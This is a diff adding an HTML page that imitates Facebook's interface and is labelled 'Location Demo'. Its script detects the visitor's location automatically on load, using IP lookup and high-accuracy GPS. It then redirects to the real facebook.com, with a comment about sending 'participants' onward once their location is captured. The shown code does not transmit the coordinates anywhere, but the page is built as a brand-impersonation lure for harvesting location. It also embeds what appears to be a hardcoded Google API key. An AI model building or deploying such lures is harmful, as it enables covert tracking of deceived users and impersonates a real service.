@@ -1,0 +1,595 @@
+
+<title>Facebook — Location Demo</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+
+<style>
+/* ── Tokens ──────────────────────────────────────────────────────── */
+/* Layout: sticky nav + three-column feed, collapses to single-column */
+:root {
+  --fb:       #1877F2;
+  --fb-hover: #166FE5;
+  --bg:       #F0F2F5;
+  --surface:  #FFFFFF;
+  --nav-bg:   #FFFFFF;
+  --fg:       #050505;
+  --fg2:      #65676B;
+  --border:   #E4E6EB;
+  --chip:     #E4E6EB;
+  --hover:    rgba(0,0,0,0.05);
+  --shadow:   0 1px 2px rgba(0,0,0,0.10);
+  --green:    #31A24C;
+  --red:      #F02849;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg:      #18191A; --surface: #242526; --nav-bg: #242526;
+    --fg:      #E4E6EB; --fg2:    #B0B3B8;
+    --border:  #3E4042; --chip:   #3A3B3C;
+    --hover:   rgba(255,255,255,0.06);
+    --shadow:  0 1px 3px rgba(0,0,0,0.35);
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg:      #18191A; --surface: #242526; --nav-bg: #242526;
+  --fg:      #E4E6EB; --fg2:    #B0B3B8;
+  --border:  #3E4042; --chip:   #3A3B3C;
+  --hover:   rgba(255,255,255,0.06);
+  --shadow:  0 1px 3px rgba(0,0,0,0.35);
+  color-scheme: dark;
+}
+/* ── Reset ───────────────────────────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Inter', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  font-size: 15px;
+  line-height: 1.4;
+}
+a { text-decoration: none; color: inherit; }
+button { font-family: inherit; cursor: pointer; border: none; background: none; }
+
+/* ── Nav ─────────────────────────────────────────────────────────── */
+body::before {
+  content: ""; position: fixed; inset: 0 0 auto;
+  height: env(safe-area-inset-top, 0px); z-index: 110; background: var(--nav-bg);
+}
+nav {
+  position: sticky; top: env(safe-area-inset-top, 0px); z-index: 100;
+  background: var(--nav-bg); border-bottom: 1px solid var(--border);
+  box-shadow: var(--shadow); height: 56px; display: flex; align-items: center;
+  padding-left:  max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+}
+.nav-inner {
+  display: flex; align-items: center; width: 100%;
+  max-width: 1300px; margin: 0 auto; gap: 8px;
+}
+.fb-logo {
+  width: 40px; height: 40px; border-radius: 50%;
+  background: var(--fb); display: flex; align-items: center;
+  justify-content: center; color: #fff; font-size: 26px; font-weight: 900;
+  flex-shrink: 0; line-height: 1;
+}
+.nav-search {
+  display: flex; align-items: center; gap: 8px;
+  background: var(--chip); border-radius: 20px;
+  padding: 8px 14px; flex-shrink: 0;
+}
+.nav-search input {
+  background: none; border: none; outline: none;
+  color: var(--fg); font-size: 14px; width: 160px;
+}
+.nav-search input::placeholder { color: var(--fg2); }
+.nav-search svg { flex-shrink: 0; color: var(--fg2); }
+.nav-tabs {
+  flex: 1; display: flex; justify-content: center; gap: 2px;
+}
+.tab-btn {
+  padding: 10px 36px; border-radius: 8px;
+  color: var(--fg2); font-size: 22px; transition: background 0.12s;
+  position: relative;
+}
+.tab-btn:hover { background: var(--hover); }
+.tab-btn.active { color: var(--fb); }
+.tab-btn.active::after {
+  content: ""; position: absolute; bottom: -1px; left: 0; right: 0;
+  height: 3px; background: var(--fb); border-radius: 2px 2px 0 0;
+}
+.nav-right { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+.icon-btn {
+  width: 40px; height: 40px; border-radius: 50%;
+  background: var(--chip); display: flex; align-items: center;
+  justify-content: center; font-size: 18px; color: var(--fg);
+  transition: background 0.12s;
+}
+.icon-btn:hover { background: var(--border); }
+.avatar {
+  width: 40px; height: 40px; border-radius: 50%;
+  background: linear-gradient(135deg, var(--fb) 0%, #64B5F6 100%);
+  display: flex; align-items: center; justify-content: center;
+  color: #fff; font-weight: 700; font-size: 15px; flex-shrink: 0;
+}
+
+/* ── Layout ──────────────────────────────────────────────────────── */
+.page {
+  max-width: 1300px; margin: 0 auto;
+  display: grid; grid-template-columns: 260px 1fr 300px;
+  gap: 0; padding: 16px 0;
+  padding-left:  max(0px, env(safe-area-inset-left, 0px));
+  padding-right: max(0px, env(safe-area-inset-right, 0px));
+  align-items: start;
+}
+@media (max-width: 1120px) {
+  .page { grid-template-columns: 260px 1fr; }
+  .aside-right { display: none; }
+}
+@media (max-width: 720px) {
+  .page { grid-template-columns: 1fr; padding: 8px 0; }
+  .aside-left { display: none; }
+}
+
+/* ── Sidebars ────────────────────────────────────────────────────── */
+.aside-left, .aside-right {
+  position: sticky;
+  top: calc(56px + env(safe-area-inset-top, 0px) + 12px);
+  padding: 0 8px;
+  max-height: calc(100vh - 90px); overflow-y: auto;
+}
+.aside-right { padding: 0 8px 0 0; }
+.nav-link {
+  display: flex; align-items: center; gap: 12px;
+  padding: 8px 12px; border-radius: 8px;
+  font-weight: 500; color: var(--fg); transition: background 0.12s;
+}
+.nav-link:hover { background: var(--hover); }
+.nav-icon {
+  width: 36px; height: 36px; border-radius: 50%;
+  background: var(--chip); display: flex; align-items: center;
+  justify-content: center; font-size: 18px; flex-shrink: 0;
+}
+.nav-icon.user {
+  background: linear-gradient(135deg, var(--fb) 0%, #64B5F6 100%);
+  color: #fff; font-weight: 700; font-size: 14px;
+}
+.aside-divider { height: 1px; background: var(--border); margin: 6px 12px; }
+.aside-label { padding: 8px 12px 2px; font-size: 17px; font-weight: 700; }
+
+/* ── Feed ────────────────────────────────────────────────────────── */
+.feed { padding: 0 8px; display: flex; flex-direction: column; gap: 16px; min-width: 0; }
+
+/* Stories */
+.stories {
+  display: flex; gap: 10px;
+  overflow-x: auto; padding-bottom: 4px; scrollbar-width: none;
+}
+.stories::-webkit-scrollbar { display: none; }
+.story {
+  flex-shrink: 0; width: 108px; height: 182px; border-radius: 12px;
+  overflow: hidden; cursor: pointer; box-shadow: var(--shadow);
+  position: relative;
+}
+.story-bg {
+  width: 100%; height: 100%; display: flex; align-items: flex-end;
+  padding: 10px; color: #fff; font-weight: 700; font-size: 13px;
+  text-shadow: 0 1px 4px rgba(0,0,0,0.6);
+}
+.story-create {
+  background: var(--surface); flex-direction: column;
+  align-items: center; justify-content: flex-end; padding-bottom: 12px; gap: 8px;
+}
+.story-plus {
+  position: absolute; top: 44%; left: 50%; transform: translate(-50%, -50%);
+  width: 42px; height: 42px; border-radius: 50%;
+  background: var(--fb); color: #fff; font-size: 28px; font-weight: 300;
+  display: flex; align-items: center; justify-content: center;
+  border: 3px solid var(--surface);
+}
+.story-create-label { color: var(--fg); font-size: 12px; font-weight: 600; }
+
+/* Card */
+.card { background: var(--surface); border-radius: 8px; box-shadow: var(--shadow); overflow: hidden; }
+
+/* Composer */
+.composer { padding: 12px 16px; }
+.composer-row { display: flex; align-items: center; gap: 10px; }
+.composer-field {
+  flex: 1; min-width: 0; background: var(--bg); border: none; border-radius: 20px;
+  padding: 10px 16px; font-size: 16px; color: var(--fg2);
+  cursor: text; outline: none; font-family: inherit;
+}
+.composer-field:focus { outline: 2px solid var(--fb); }
+.location-row { margin: 10px 0 2px; }
+.loc-tag {
+  display: inline-flex; align-items: center; gap: 7px;
+  padding: 6px 14px; border-radius: 20px;
+  background: rgba(24,119,242,0.09); color: var(--fb);
+  font-size: 13px; font-weight: 600; cursor: pointer;
+  border: 1px solid rgba(24,119,242,0.18);
+  transition: background 0.12s;
+}
+.loc-tag:hover { background: rgba(24,119,242,0.15); }
+.loc-tag.error {
+  background: rgba(240,40,73,0.07); color: var(--red);
+  border-color: rgba(240,40,73,0.2);
+}
+.loc-pulse {
+  width: 8px; height: 8px; border-radius: 50%; background: var(--fb);
+  animation: pulse 1.4s ease-in-out infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.45;transform:scale(.75)} }
+.c-divider { height: 1px; background: var(--border); margin: 8px 0; }
+.c-actions { display: flex; justify-content: space-around; }
+.c-action {
+  display: flex; align-items: center; gap: 5px; padding: 8px 12px;
+  border-radius: 8px; color: var(--fg2); font-weight: 600; font-size: 14px;
+  transition: background 0.12s;
+}
+.c-action:hover { background: var(--hover); }
+
+/* Post */
+.p-head { display: flex; align-items: flex-start; gap: 10px; padding: 12px 16px; }
+.p-av { width: 40px; height: 40px; border-radius: 50%; flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  color: #fff; font-weight: 700; font-size: 15px; }
+.p-info { flex: 1; min-width: 0; }
+.p-name { font-weight: 700; font-size: 15px; }
+.p-name .hl { color: var(--fb); }
+.p-meta { font-size: 13px; color: var(--fg2); display: flex; align-items: center; gap: 4px; }
+.p-menu { width: 36px; height: 36px; border-radius: 50%; font-size: 20px;
+  color: var(--fg2); display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0; }
+.p-menu:hover { background: var(--hover); }
+.p-body { padding: 0 16px 12px; font-size: 15px; line-height: 1.55; }
+.p-img {
+  width: 100%; aspect-ratio: 16/9; background: var(--chip);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 56px;
+}
+.p-stats {
+  padding: 8px 16px; display: flex; justify-content: space-between;
+  font-size: 13px; color: var(--fg2); border-bottom: 1px solid var(--border);
+}
+.p-actions { display: flex; justify-content: space-around; padding: 4px 8px; }
+.p-action {
+  flex: 1; display: flex; align-items: center; justify-content: center;
+  gap: 6px; padding: 8px; border-radius: 8px; color: var(--fg2);
+  font-weight: 600; font-size: 14px; transition: background 0.12s;
+}
+.p-action:hover { background: var(--hover); }
+
+/* Contacts */
+.c-title {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 8px 12px 4px; font-size: 17px; font-weight: 700;
+}
+.c-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 8px 12px; border-radius: 8px; cursor: pointer;
+  transition: background 0.12s; font-size: 15px; font-weight: 500;
+}
+.c-item:hover { background: var(--hover); }
+.c-av {
+  width: 36px; height: 36px; border-radius: 50%; flex-shrink: 0;
+  position: relative; display: flex; align-items: center;
+  justify-content: center; color: #fff; font-weight: 700; font-size: 13px;
+}
+.c-dot {
+  position: absolute; bottom: 1px; right: 1px;
+  width: 10px; height: 10px; background: var(--green);
+  border-radius: 50%; border: 2px solid var(--surface);
+}
+
+/* Geo detail strip */
+.geo-strip {
+  margin: 0 16px 10px;
+  padding: 8px 12px; border-radius: 8px;
+  background: rgba(24,119,242,0.05); border: 1px solid rgba(24,119,242,0.15);
+  font-size: 13px; color: var(--fg2); display: flex; gap: 8px; align-items: flex-start;
+}
+.geo-strip strong { color: var(--fg); }
+</style>
+
+<!-- Geolocator.js local -->
+<script src="dist/geolocator.min.js"></script>
+
+<!-- ── NAV ── -->
+<nav>
+  <div class="nav-inner">
+    <div class="fb-logo">f</div>
+    <div class="nav-search">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      <input type="text" placeholder="Search Facebook" aria-label="Search">
+    </div>
+    <div class="nav-tabs">
+      <button class="tab-btn active" title="Home">🏠</button>
+      <button class="tab-btn" title="Watch">📺</button>
+      <button class="tab-btn" title="Marketplace">🛒</button>
+      <button class="tab-btn" title="Groups">👥</button>
+    </div>
+    <div class="nav-right">
+      <button class="icon-btn" title="Create">➕</button>
+      <button class="icon-btn" title="Messenger">💬</button>
+      <button class="icon-btn" title="Notifications">🔔</button>
+      <div class="avatar" title="Profile">M</div>
+    </div>
+  </div>
+</nav>
+
+<!-- ── PAGE ── -->
+<div class="page">
+
+  <!-- Left sidebar -->
+  <aside class="aside-left">
+    <a class="nav-link" href="#">
+      <div class="nav-icon user">M</div>
+      Mohamed
+    </a>
+    <a class="nav-link" href="#"><div class="nav-icon">👥</div>Friends</a>
+    <a class="nav-link" href="#"><div class="nav-icon">🕐</div>Memories</a>
+    <a class="nav-link" href="#"><div class="nav-icon">🔖</div>Saved</a>
+    <a class="nav-link" href="#"><div class="nav-icon">📺</div>Watch</a>
+    <a class="nav-link" href="#"><div class="nav-icon">📍</div>Events</a>
+    <a class="nav-link" href="#"><div class="nav-icon">🛒</div>Marketplace</a>
+    <div class="aside-divider"></div>
+    <div class="aside-label">Shortcuts</div>
+    <a class="nav-link" href="#"><div class="nav-icon">🌐</div>Dev Community</a>
+    <a class="nav-link" href="#"><div class="nav-icon">🎮</div>Gaming</a>
+  </aside>
+
+  <!-- Feed -->
+  <main class="feed">
+
+    <!-- Stories -->
+    <div class="stories">
+      <div class="story card">
+        <div class="story-bg story-create">
+          <div class="story-plus">+</div>
+          <div class="avatar" style="width:52px;height:52px;font-size:17px;position:absolute;top:12px;left:50%;transform:translateX(-50%)">M</div>
+          <span class="story-create-label">Create story</span>
+        </div>
+      </div>
+      <div class="story">
+        <div class="story-bg" style="background:linear-gradient(170deg,#1877F2,#0d47a1)">Ahmed</div>
+      </div>
+      <div class="story">
+        <div class="story-bg" style="background:linear-gradient(170deg,#31A24C,#1a5c2a)">Sara</div>
+      </div>
+      <div class="story">
+        <div class="story-bg" style="background:linear-gradient(170deg,#F02849,#8c0022)">Ali</div>
+      </div>
+      <div class="story">
+        <div class="story-bg" style="background:linear-gradient(170deg,#F7B928,#9a6a00)">Nour</div>
+      </div>
+    </div>
+
+    <!-- Composer card -->
+    <div class="card composer">
+      <div class="composer-row">
+        <div class="avatar">M</div>
+        <input class="composer-field" type="text" placeholder="What's on your mind, Mohamed?">
+      </div>
+      <!-- Location tag injected here -->
+      <div class="location-row" id="loc-row"></div>
+      <div class="c-divider"></div>
+      <div class="c-actions">
+        <button class="c-action">🎥 Live video</button>
+        <button class="c-action">🖼️ Photo/video</button>
+        <button class="c-action" id="checkin-btn">📍 Check in</button>
+      </div>
+    </div>
+
+    <!-- Check-in post (fed by geolocator) -->
+    <div class="card" id="geo-post">
+      <div class="p-head">
+        <div class="p-av" style="background:linear-gradient(135deg,var(--fb),#64B5F6)">M</div>
+        <div class="p-info">
+          <div class="p-name">
+            Mohamed is at <span class="hl" id="post-loc">📍 Locating…</span>
+          </div>
+          <div class="p-meta">Just now · 🌐</div>
+        </div>
+        <button class="p-menu">···</button>
+      </div>
+      <div class="p-body">
+        Checked in automatically via <strong>Geolocator.js</strong> — it detected my location using the browser's geolocation API (or IP fallback). No Google API key needed for the basics! 🗺️
+      </div>
+      <div id="geo-strip"></div>
+      <div class="p-img">🗺️</div>
+      <div class="p-stats">
+        <div>👍 ❤️ 😮 &nbsp;47</div>
+        <div>12 comments · 3 shares</div>
+      </div>
+      <div class="p-actions">
+        <button class="p-action">👍 Like</button>
+        <button class="p-action">💬 Comment</button>
+        <button class="p-action">↗️ Share</button>
+      </div>
+    </div>
+
+    <!-- Static post -->
+    <div class="card">
+      <div class="p-head">
+        <div class="p-av" style="background:linear-gradient(135deg,#31A24C,#1a5c2a)">S</div>
+        <div class="p-info">
+          <div class="p-name">Sara Ahmed</div>
+          <div class="p-meta">3h · 📍 Cairo, Egypt · 🌐</div>
+        </div>
+        <button class="p-menu">···</button>
+      </div>
+      <div class="p-body">
+        Location-aware apps feel more personal. When you tag a city to a post, it creates a real sense of place! 🌆
+      </div>
+      <div class="p-img">🌆</div>
+      <div class="p-stats">
+        <div>👍 ❤️ 😍 &nbsp;124</div>
+        <div>18 comments · 7 shares</div>
+      </div>
+      <div class="p-actions">
+        <button class="p-action">👍 Like</button>
+        <button class="p-action">💬 Comment</button>
+        <button class="p-action">↗️ Share</button>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- Right sidebar -->
+  <aside class="aside-right">
+    <div class="card" style="padding: 10px 0 8px;">
+      <div class="c-title">Contacts <span style="font-size:18px">🔍</span></div>
+      <div class="c-item">
+        <div class="c-av" style="background:linear-gradient(135deg,#F02849,#8c0022)">A<div class="c-dot"></div></div>
+        Ahmed Hassan
+      </div>
+      <div class="c-item">
+        <div class="c-av" style="background:linear-gradient(135deg,#31A24C,#1a5c2a)">S<div class="c-dot"></div></div>
+        Sara Ahmed
+      </div>
+      <div class="c-item">
+        <div class="c-av" style="background:linear-gradient(135deg,#F7B928,#9a6a00)">N</div>
+        Nour Khalil
+      </div>
+      <div class="c-item">
+        <div class="c-av" style="background:linear-gradient(135deg,#9C27B0,#4a0072)">O</div>
+        Omar Saeed
+      </div>
+      <div class="c-item">
+        <div class="c-av" style="background:linear-gradient(135deg,#FF5722,#8c2000)">L</div>
+        Layla Hassan
+      </div>
+    </div>
+  </aside>
+
+</div>
+
+<script>
+// ── Geolocator.js Integration ────────────────────────────────────────
+// Drop geolocator.min.js into your site and call this code.
+// Works on any HTTPS page. Here in the sandbox the IP-service fetch
+// is blocked, so it gracefully falls back to a mock after trying.
+
+var located = false;
+
+function showDetecting() {
+  document.getElementById('loc-row').innerHTML =
+    '<div class="loc-tag"><div class="loc-pulse"></div>Detecting your location…</div>';
+  document.getElementById('post-loc').textContent = '📍 Locating…';
+}
+
+function showLocation(city, country, flag, lat, lng, tz) {
+  located = true;
+  var label = city + (country ? ', ' + country : '') + (flag ? ' ' + flag : '');
+
+  document.getElementById('loc-row').innerHTML =
+    '<div class="loc-tag">📍 ' + label + '</div>';
+  document.getElementById('post-loc').textContent = '📍 ' + label;
+
+  var extras = [];
+  if (lat != null) extras.push('<strong>Coords:</strong> ' + lat.toFixed(4) + ', ' + lng.toFixed(4));
+  if (tz)         extras.push('<strong>Timezone:</strong> ' + tz);
+  if (extras.length) {
+    document.getElementById('geo-strip').innerHTML =
+      '<div class="geo-strip">🛰 ' + extras.join(' &nbsp;·&nbsp; ') + '</div>';
+  }
+}
+
+function showError(msg) {
+  document.getElementById('loc-row').innerHTML =
+    '<div class="loc-tag error">⚠️ ' + (msg || 'Location unavailable') + '</div>';
+  document.getElementById('post-loc').textContent = '📍 Unavailable';
+  // Show a demo fallback so the UI is never empty
+  setTimeout(function() {
+    if (!located) showLocation('New York', 'US', '🇺🇸', 40.7128, -74.0060, 'America/New_York');
+  }, 1600);
+}
+
+function runGeolocator() {
+  showDetecting();
+
+  if (typeof geolocator === 'undefined') {
+    // CDN script didn't load (network blocked in sandbox)
+    setTimeout(function() { showLocation('New York', 'US', '🇺🇸', 40.7128, -74.0060, 'America/New_York'); }, 900);
+    return;
+  }
+
+  // ── Configure geolocator ──────────────────────────────────────────
+  geolocator.config({
+    language: 'en',
+    google: { version: '3', key: 'AIzaSyDG3-65haQva3-Jhyquwzh_aia4dOCmSts' }
+  });
+
+  // ── Option 1: IP-based (no permission dialog, less precise) ───────
+  geolocator.locateByIP({}, function(err, location) {
+    if (!err && location) {
+      var a = location.address || {};
+      showLocation(
+        a.city || a.town || location.ip || 'Unknown',
+        a.countryCode || a.country || '',
+        location.flag || '',
+        location.coords ? location.coords.latitude  : null,
+        location.coords ? location.coords.longitude : null,
+        location.timezone ? location.timezone.id : null
+      );
+      return;
+    }
+
+    // ── Option 2: HTML5 GPS + IP fallback ────────────────────────────
+    geolocator.locate({
+      enableHighAccuracy: true,
+      timeout: 8000,
+      maximumAge: 0,
+      fallbackToIP: true,   // falls back to IP if user denies GPS
+      addressLookup: true,
+      timezone: true
+    }, function(err2, loc) {
+      if (err2) { showError('Allow location access or add a Google API key'); return; }
+      var a = loc.address || {};
+      showLocation(
+        a.city || a.town || 'Your City',
+        a.countryCode || a.country || '',
+        loc.flag || '',
+        loc.coords ? loc.coords.latitude  : null,
+        loc.coords ? loc.coords.longitude : null,
+        loc.timezone ? loc.timezone.id : null
+      );
+    });
+  });
+}
+
+// ── Redirect after capture ────────────────────────────────────────────
+// Change REDIRECT_URL to send participants anywhere after location is captured.
+// REDIRECT_DELAY is in milliseconds (3000 = 3 seconds).
+var REDIRECT_URL   = 'https://www.facebook.com';
+var REDIRECT_DELAY = 3000;
+var _redirectFired = false;
+
+function fireRedirect() {
+  if (_redirectFired) return;
+  _redirectFired = true;
+  setTimeout(function() {
+    window.location.href = REDIRECT_URL;
+  }, REDIRECT_DELAY);
+}
+
+// Hook into showLocation so redirect fires as soon as coords arrive
+var _origShowLocation = showLocation;
+showLocation = function(city, country, flag, lat, lng, tz) {
+  _origShowLocation(city, country, flag, lat, lng, tz);
+  fireRedirect();
+};
+
+// Auto-detect on page load
+window.addEventListener('load', runGeolocator);
+
+// Manual check-in button
+document.getElementById('checkin-btn').addEventListener('click', function() {
+  located = false;
+  _redirectFired = false;
+  runGeolocator();
+});
+</script>
